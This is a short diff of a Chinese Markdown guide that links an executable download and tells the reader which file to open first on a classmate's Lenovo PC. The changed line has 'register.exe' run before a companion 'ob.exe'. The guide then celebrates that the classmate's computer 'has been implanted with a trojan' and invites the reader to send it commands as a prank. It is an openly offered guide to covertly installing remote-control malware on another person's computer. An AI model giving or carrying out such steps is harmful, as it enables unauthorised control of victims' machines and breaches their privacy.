@@ -12,7 +12,7 @@ https://osfiles.pages.dev/showmsg.exe
 
 打开`此电脑`，然后打开`C:\`，然后打开`Users`文件夹或`用户`文件夹，然后打开`Lenovo`文件夹，然后打开`下载`文件夹或`Downloads`文件夹;
 
-打开`register.exe`，记住一定要先打开
+打开`register.exe`，记住一定要比同伴的`ob.exe`先打开
 
 # 很好，你做到了！
 同学电脑成功被你植入了木马，现在在那个register.exe窗口里输入以下命令玩玩同学吧（
